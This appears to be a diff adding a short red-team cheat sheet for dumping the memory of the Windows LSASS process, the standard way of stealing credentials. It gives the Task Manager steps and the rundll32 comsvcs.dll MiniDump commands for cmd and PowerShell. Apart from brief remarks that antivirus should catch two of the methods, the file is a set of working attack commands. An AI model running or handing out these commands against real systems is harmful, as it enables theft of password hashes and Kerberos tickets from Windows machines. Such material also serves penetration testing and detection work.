@@ -1,0 +1,20 @@
+#################### DUMPING WITH TASK MANAGER ####################
+Task Manager > Processes > local security authority > Create dump file
+lsass.dmp is created in %temp%
+
+
+
+#################### DUMPING WITH CMD ####################
+!!!A GOOD AV SHOULD PREVENT & LOG THIS METHOD!!!
+tasklist /svc                                                                       read the pid of lsass service
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\lsass.dmp full    dump lsass
+
+
+
+#################### DUMPING WITH POWERSHELL ####################
+!!!A GOOD AV SHOULD PREVENT & LOG THIS METHOD!!!
+Get-Process lsass                                                                     read the id of lsass service
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full              dump lsass
+
+
+
